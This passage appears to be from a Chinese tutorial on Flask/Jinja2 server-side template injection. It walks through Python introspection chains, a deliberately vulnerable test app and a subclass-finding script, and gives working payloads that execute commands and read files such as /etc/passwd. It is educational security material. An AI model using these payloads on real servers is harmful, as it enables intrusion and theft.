以字符串形式返回一个类所直接集成的类
**0x04`__mro__`**
返回解析方法调用的顺序。
    >>> "".__class__.__mro__
    (, )
**0x05`__subclasses__()`**
获取类的所有子类，经常配合`__bases__` `__mro__`来找到我们想要的读取文件或执行命令的类
比如：`"".__class__.__bases__[0].__subclasses__()`
或者：`"".__class__.__mro__[1].__subclasses__()`
**0x06`__init__`**
所有的可被当作模块导入的都包含 `__init__`方法，通过此方法来调用 `__globals__`方法
**0x07`__globals__`**
所有函数都会有一个 `__globals__` 属性， 用于获取当前空间下可使用的模块、方法及其所有变量，结果是一个字典。
    >>> import os
    >>> var = 2333
    >>> def fun():
        pass
    >>> class test:
        def __init__(self):
            pass
    >>> print(test.__init__.__globals__)
    {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': , '__spec__': None, '__annotations__': {}, '__builtins__': , 'os': , 'var': 2333, 'fun': , 'test': }
**0x08`__builtins__`**
**在pyton2中为`__builtins__` 和 `__builtin__`**
这里 `__builtins__`
是内建名称空间，是这个模块本身定义的一个名称空间，在这个内建名称空间中存在一些我们经常用到的内置函数（即不需要导入包即可调用的函数）如：print()、str()还包括一些异常和其他属性。
而 `__builtins__` 实际上是一个指向或者说引用 `__builtin__` 的（有点类似于软链接），而真正BIF在被定义时是在
`__builtin__` 模块中进行的。
**在python3中为`__builtins__` 和 `builtins`**
这里只不过 `builtins` 代替的 `__builtin__`
在python中有一些BIF（内置函数）是可以直接调用的，比如str(), print()等，这些函数可以通过 `dir(__builtins__)`
可以查到。
**0x09 内省request对象**
即为Flask模板的一个全局变量request对象（flask.request），代表当前请求对象。
当然可利用的远不止这些，上面只是做一点简单的总结，后续遇到有趣的姿势继续补充（填坑）。
###  利用思路
1、随便找一个内置类对象利用 `__class__`拿到该对象所对应的类
    ''.__class__.__bases__[0].__subclasses__()
    ().__class__.__mro__[2].__subclasses__()
    ().__class__.__mro__[-1].__subclasses__()
    request.__class__.__mro__[1]
2、用 `__bases__` 或 `__mro__` 拿到基类 ``
3、用 `__subclasses__()` 获取所有子类
4、在子类中寻找可以合适的继承链执行命令或读取文件
## STTI利用
###  测试代码
    from flask import Flask, request
    from jinja2 import Template
    app = Flask(__name__)
    @app.route('/')
    def test1():
        name = request.args.get('name')
        t = Template('''
    Zh1z3ven
        Hello, %s !
        '''% (name))
        return t.render()
    if __name__ == '__main__':
        app.run(host='127.0.0.1', debug=True)
### 0x01 `__bultins__`
**python2 &python3均适用**
比如我们打开一个python3的shell，键入 `"".__class__`
可以看到结果为 ``
再接着下一步，我们要获取到基类 `object` 键入：`"".__class__.__bases__`
可以看到结果是一个元组，而元组的第一个元素是基类 `object` ，所以要获取基类需要 `.__bases__[0]` ; 我们下面看看基类下的所有子类
，键入： `"".__class__.__bases__[0].__subclasses__()`
这里可以看到有相当多的子类，且不同的Python版本在这里获取到的所有子类的顺序也不同，但是这样还是不太直观毕竟有几百个子类，我们用个小脚本进行筛选看看各个子类所处空间下可调用的模块、方法和变量都有什么也就是
`function.__globals__` 的结果。下面贴个寻找类对应顺序的脚本：
用法大概是这样的，因为大概思路前面前三步基本差不多，主要是后面 `__init__.__globals__`
后面的姿势会很多，也是一个难理解的点。这个脚本就是找从`__init__.__globals__`
后面想要根据那个思路入手取执行命令或读取文件，比如下面我想用 `__builtins__` 去构造执行命令的继承链:
先查询都哪些子类调用了`__builtins__`
find.py
    search = '__builtins__'   
    num = -1
    for i in ().__class__.__bases__[0].__subclasses__():
        num += 1
        try:
            if search in i.__init__.__globals__.keys():
                print(i, num)
        except:
            pass
这里拿经典的 ` 128` 举例，构造payload如下：
`http://127.0.0.1:5000/?name={{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')}}`
ps：eval()函数用来执行一个字符串表达式，并返回表达式的值，这里相当于调用了os模块利用popen函数执行whoami
当然利用`__builtins__`还有很多其他姿势，需要注意的就是python2与python3中有些函数不一样需要进行替换
**Python3 payload**
    # 0x01 利用eval()将其中字符串作为代码执行  
    {{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")}}
    {{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
    # 0x02 直接调用__import__()构造payload执行命令
    {{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}
    # 0x03 调用open()读取文件
    {{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['open']('C:\\Windows\win.ini').read()}}
**python2 payload**
（1）linecache执行命令
同样是先找到子类中有可直接调用linecache的，
    (, 59)
    (, 60)
payload
    {{[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].os.popen('whoami').read()}}
（2） file类读取文件
file类是只存在python2的，python3没有，但是类似于open
payload
    {{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}
    {{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()}}
### 0x02
`['popen']("command").read()`
这里思路是直接找某个子类可以直接调用popen这个方法，这里在本地找到的是 `os._wrap_close` 这个类。
payload
    http://127.0.0.1:5000/?name={{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']("whoami").read()}}`
### 0x03 直接调用 `__import__()`
这里思路是找子类中可以直接调用 `__import__()` 然后引用 os 模块去执行命令
先通过find.py找到可以直接调用 `__import__()`的子类
之后通过 `__import__()` 调用os模块去执行命令，payload如下：
    {{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
###  0x04 利用循环构造payload
上面提到过 `{% for i in [1, 2, 3] %}Zh1z3ven{%endfor%}` 可用作循环。我们改造下0x01 中利用
`os._wrap_close` 类的 `['__builtins__']['eval']` 注入
**执行命令的payload** 如下,这里有一个小坑点，比如我们第一次if判断 `if i.__name__ ==
'_wrap_close'`时，==右面不能写 `os._wrap_close` 而要写`_wrap_close` ,因为 `__name__` 返回值是
`_wrap_close`
    {% for i in "".__class__.__base__.__subclasses__() %}
    {% if i.__name__ == '_wrap_close' %}
      {% for x in i.__init__.__globals__.values() %}   
      {% if x.__class__ == {}.__class__ %}  # 筛选出dict类型元素
        {% if 'eval' in x.keys() %}  
            {{ x['eval']('__import__("os").popen("whoami").read()')}}
        {% endif %}
      {% endif %}
      {% endfor %}
    {% endif %}
    {% endfor %}
**读取文件payload** ,注意Windows环境需要 `\\` 标识路径
    {% for i in "".__class__.__base__.__subclasses__() %}{% if i.__name__ == '_wrap_close' %}{{i.__init__.__globals__['__builtins__'].open('C:\\Users\\LENOVO\\Desktop\\1.txt', 'r').readlines()}}{% endif %}{% endfor %}
## 小结
当然关于SSTI利用远不止这些，且还有常见的过滤以及被ban函数的相关绕过姿势这里也没有写上，准备下一篇记录关于CTF基于常见的过滤的绕过姿势。这篇主要还是放在理解Flask+jinja2语法和SSTI这个洞入门。
## 参考文章